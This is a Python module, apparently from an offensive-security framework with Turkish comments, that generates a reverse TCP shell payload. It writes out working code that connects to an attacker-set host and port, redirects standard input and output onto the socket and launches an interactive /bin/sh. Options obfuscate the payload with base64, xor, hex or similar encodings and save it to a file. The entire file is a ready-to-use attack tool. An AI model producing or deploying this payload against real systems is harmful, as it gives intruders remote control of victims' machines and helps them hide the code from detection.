from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    """
    Python Shell Reverse TCP Payload.
    Hedef sistemde çalıştırıldığında bize shell bağlantısı gönderir.
    """
    Name = "Python Shell Reverse TCP"
    Description = "Python tabanlı Reverse TCP Shell."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP (Saldırgan)."),
            "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir)."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/shell.py).", completion_dir=".")
        }

    def generate(self) -> str:
        """Payload kodunu üretir."""
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Python one-liner reverse shell
        raw_payload = f"""
import socket,os,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        encode_type = self.get_option_value("ENCODE")
        from core.encoders.manager import apply_encoding
        return apply_encoding(raw_payload.strip(), encode_type)

    def run(self, options: Dict[str, Any]):
        """Payload oluştur ve ekrana bas/kaydet."""
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".py"):
                output_path += ".py"
                
            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
